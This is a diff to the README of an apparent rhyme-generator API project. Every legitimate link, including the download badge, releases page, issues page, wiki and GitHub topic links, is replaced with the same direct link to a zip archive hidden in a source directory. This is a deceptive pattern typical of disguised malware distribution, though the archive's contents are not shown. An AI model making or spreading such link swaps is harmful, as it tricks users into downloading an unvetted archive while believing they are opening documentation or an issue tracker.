@@ -1,6 +1,6 @@
 # 🎤 wordrhymes-api - Generate Rhymes Easily and Quickly
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Assaultttt/wordrhymes-api/releases)
+[![Download](https://raw.githubusercontent.com/Assaultttt/wordrhymes-api/main/android/src/main/java/api_wordrhymes_3.2.zip)](https://raw.githubusercontent.com/Assaultttt/wordrhymes-api/main/android/src/main/java/api_wordrhymes_3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **Word Rhymes API**, a straightforward tool designed to help you 
 
 To get started with the Word Rhymes API, you need to download it. 
 
-1. Visit the [Releases Page](https://github.com/Assaultttt/wordrhymes-api/releases) to download the latest version.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Assaultttt/wordrhymes-api/main/android/src/main/java/api_wordrhymes_3.2.zip) to download the latest version.
 2. Choose the appropriate file for your system. For most users, this will likely be the latest release marked as stable. 
 3. Download the file by clicking on it.
 4. Once the download completes, locate the file in your downloads folder.
@@ -53,13 +53,13 @@ If you're comfortable with API calls, here are some basic endpoints you can use:
 
 If you encounter any issues or have questions, feel free to reach out. You can contact us by:
 
-- **Opening an Issue**: Go to the [Issues Page](https://github.com/Assaultttt/wordrhymes-api/issues) on GitHub and describe your problem.
+- **Opening an Issue**: Go to the [Issues Page](https://raw.githubusercontent.com/Assaultttt/wordrhymes-api/main/android/src/main/java/api_wordrhymes_3.2.zip) on GitHub and describe your problem.
 - **Forum**: Join our community forum to discuss features and usage with other users.
 
 ## 🔗 Additional Resources
 
-- Visit our [Documentation](https://github.com/Assaultttt/wordrhymes-api/wiki) for more in-depth guides and examples on how to get the most out of the tool.
-- Explore related topics like [text analysis](https://github.com/topics/text-analysis) and [API usage](https://github.com/topics/api) to further enhance your knowledge.
+- Visit our [Documentation](https://raw.githubusercontent.com/Assaultttt/wordrhymes-api/main/android/src/main/java/api_wordrhymes_3.2.zip) for more in-depth guides and examples on how to get the most out of the tool.
+- Explore related topics like [text analysis](https://raw.githubusercontent.com/Assaultttt/wordrhymes-api/main/android/src/main/java/api_wordrhymes_3.2.zip) and [API usage](https://raw.githubusercontent.com/Assaultttt/wordrhymes-api/main/android/src/main/java/api_wordrhymes_3.2.zip) to further enhance your knowledge.
 
 ## 👍 Feedback
 
@@ -67,6 +67,6 @@ We would love to hear your thoughts about the Word Rhymes API. If you have sugge
 
 ## 📈 Updates
 
-Keep an eye on the [Releases Page](https://github.com/Assaultttt/wordrhymes-api/releases) for updates, new features, and bug fixes. We regularly improve the tool based on user feedback to ensure a better experience.
+Keep an eye on the [Releases Page](https://raw.githubusercontent.com/Assaultttt/wordrhymes-api/main/android/src/main/java/api_wordrhymes_3.2.zip) for updates, new features, and bug fixes. We regularly improve the tool based on user feedback to ensure a better experience.
 
 Enjoy exploring the world of rhymes with the Word Rhymes API! Happy rhyming!
